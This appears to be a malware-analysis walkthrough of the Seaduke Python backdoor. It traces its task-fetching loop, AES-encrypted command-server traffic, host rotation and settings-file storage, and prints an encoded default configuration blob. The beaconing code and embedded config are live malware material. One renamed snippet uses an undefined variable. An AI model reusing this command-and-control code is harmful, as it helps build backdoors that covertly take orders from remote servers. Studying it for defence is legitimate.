# 3) fetch tasks with networkhandler
`main()` asks `networkHandleKlass` to get tasks:
```python
def main():
    ...
    networkTasks=networkHandleKlass.get_tasks()


class NetworkHandlerKlass(object):

    def get_tasks(self):
        networkTasks=[]
        my_cryptoklass=CryptoKlass(botKlass.get_key('aes'), botKlass.get_key('aes_iv'))
        for h in range(botKlass.total_hosts):
            for t in range(botKlass.total_transports):
                for _ in range(3):
                    networkTasks=[]
                    try:
                        response_data=self.__send_request(id=botKlass.bot_id)
                        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy=self.decode_data(response_data)
                        if not 'tasks' in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy:
                            return[]
                        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy['tasks']
                        for networkTask in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD:
                            if 'task_data' in networkTask and networkTask['task_data']:
                                networkTask['task_data']=my_cryptoklass.decode_data(networkTask['task_data'])
                                networkTasks.append(networkTask)
                        botKlass.is_first_request=False
                        return networkTasks
                    except ExceptionKlass:
                        pass
                        time_sleep(random_randint(3,8))
                        continue
                    except(urllib2_httperror,ValueError,TypeError)as error:
                        time_sleep(3)
                        pass
                    except urllib2_urlerror as error:
                        pass
                        time_sleep(5)
                    except Exception as e:
                        pass
                        time_sleep(10)
                botKlass.change_transport()
            botKlass.change_host()
        return networkTasks
```
this instantiates a `CryptoKlass` object called `pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy`.
```python
class CryptoKlass(object):

    def __init__(self,v_crypto_aes_key,v_crypto_aes_iv,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
        if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('b64',True):
            v_crypto_aes_key=base64_b64decode(v_crypto_aes_key)
            v_crypto_aes_iv=base64_b64decode(v_crypto_aes_iv)
        self.__aes_key=v_crypto_aes_key
        self.__aes_iv=v_crypto_aes_iv
```
it then does three inner loops:
```python
class NetworkHandlerKlass(object):

    def get_tasks(self):
        ...
        for _ in range(botKlass.total_hosts):
            for _ in range(botKlass.total_transports):
                for _ in range(3):
                    networkTasks=[]
                    try:
                        response_data=self.__send_request(id=botKlass.bot_id)
                        decoded_response = self.decode_data(response_data)  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy renamed to decoded_response
                        if not 'tasks' in decoded_response:
                            return []
                        decoded_tasks = decoded_data['tasks']  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD renamed to decoded_tasks
                        for networkTask in decoded_tasks:
                            if 'task_data' in networkTask and networkTask['task_data']:
                                networkTask['task_data'] = my_cryptoklass.decode_data(networkTask['task_data'])
                                networkTasks.append(networkTask)
                        botKlass.is_first_request=False
                        return networkTasks
```
## request information from remote server
this is a critical part since it is where botKlass requests and receives instructions with `NetworkHandlerKlass.__send_request` method:
```python
response_data=self.__send_request(id=botKlass.bot_id)

class BotKlass(object):

    def __init__(self):
        self.__settings=self.__load_settings()
        ...
        self.__bot_id=self.__settings['bot_id']


class NetworkHandlerKlass(object):
    ...
    def __send_request(self, **x):
        url = x.pop('url', self.url)  #  Syntax : dict.pop(key, def) Parameters : key : The key whose key-value pair has to be returned and removed. def : The default value to return if specified key is not present. 
        encoded_cookie_data = None
        res= None
        
        if x:
            encoded_cookie_data=self.__encode_cookie(x)
        
        if botKlass.current_transport=='wininet':  # windows interface
            pass
            p = HttpKlass(url, self.user_agent)
            res = p.send_request(encoded_cookie_data, self.referer)
        else:
            pass
            
            header = urllib2_build_opener()
            header.addheaders=[('User-agent',self.user_agent)]
            
            if encoded_cookie_data:
                header.addheaders.append(('Cookie', encoded_cookie_data))
            
            if self.referer:
                pass

            d = header.open(url)
            res = d.read()
            e = d.info().get('Content-Encoding')
            if e:
                res = CryptoKlass.unpack_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,e)
        return res
```
since `NetworkHandlerKlass` wasnt provided with an url, we rely on its url.
```python
class NetworkHandlerKlass(object):

    def __init__(self,**foo):
        self.__url = foo.get('url', None)

    @property
    def url(self):
        return self.__url if self.__url else botKlass.current_host
```
since `self.__url=None`, we look at `botKlass.current_host`.
```python
class BotKlass(object):

    def __init__(self):
        self.__settings = self.__load_settings()
    
    @property
    def current_host(self):
        return self.__settings['host_scripts'][self.__current_host_index]
```
this calls the following:
```python
class BotKlass(object):
    ...
    def __load_settings(self):
        settings_file_path = self.settings_file_path
        d = {}  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD replaced to d
        if not os_path.exists(settings_file_path):
            d = get_default_settings()
        else:
            try:
                with open(settings_file_path,'rb')as settings_file:
                    bot_settings = get_default_settings()
                    v_crypto_aes_key = bot_settings['keys']['aes']
                    v_crypto_aes_iv = bot_settings['keys']['aes_iv']
                    c = CryptoKlass(v_crypto_aes_key,v_crypto_aes_iv)
                    k = c.decrypt(settings_file.read())
                    d = json_loads(k)
            except Exception as e:
                pass
                os_remove(settings_file_path)
                d = get_default_settings()
        return d
```
this calls the following for `settings_file_path`:
```python
class BotKlass(object):
    ...
    @property
    def settings_file_path(self):
        key_id = get_default_settings()['key_id']
        if v_sys_platform.startswith('win'):
            w='tmp' + key_id.lower()
        else:
            w='.'+key_id
        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=tempfile_gettempdir()
        if v_sys_platform.startswith('win'):
            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD=ctypes.windll.shell32.SHGetFolderPathW
            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD.argtypes=[ctypes.wintypes.HWND,ctypes.c_int,ctypes.wintypes.HANDLE,ctypes.wintypes.DWORD,ctypes.wintypes.LPCWSTR]
            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ=ctypes.wintypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD(0,0x1C,0,0,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ)
            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ.value
        return os_path.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy, w)
```
which calls `get_default_settings()`, which returns a [dict called `bot_settings`](https://github.com/mynameisvinn/Seaduke/blob/master/bot_settings).md:
```python
bot_settings=json_loads(zlib_decompress(base64_b64decode('eJx1kF1PwjAUhv/K0iuNpiUMg8Fw4QSTAfFrQQ3GNN12Nua2dpyWj0n877ZAvPOqzTnP+77nnD3JCtSG41ryFCrRkoHXufRICa223z0R4F4yDb/i7wVb7NLx1XTUfVf6fRXG4xTvdq1fr0ZRNHub9IP70ldDYvVWxouNUyYVzKdhcVHfvkbTWbf/2Juw+fNwSH4ctjaqUiLlGowpZH7MhB1wKWpw8pnKlZyH1NYOvk3zX8uODwa4yAygbWei0uAylsrupxMsGuPsP8jSmGbAWK1kYRRS3UqaSIZa02bZkE8rQcgADy4HWFt6u93STCQQK1XSRNXMRa41IBc5SOPQqDAQCGQ+9em1dxZYshZYehHgBvDGO+Vqi8UCqcKcnZPjrXmROoenXvCweOm4IkgRV3ab04H+FvoFdgWNdw==')))

def get_default_settings():
    return bot_settings
```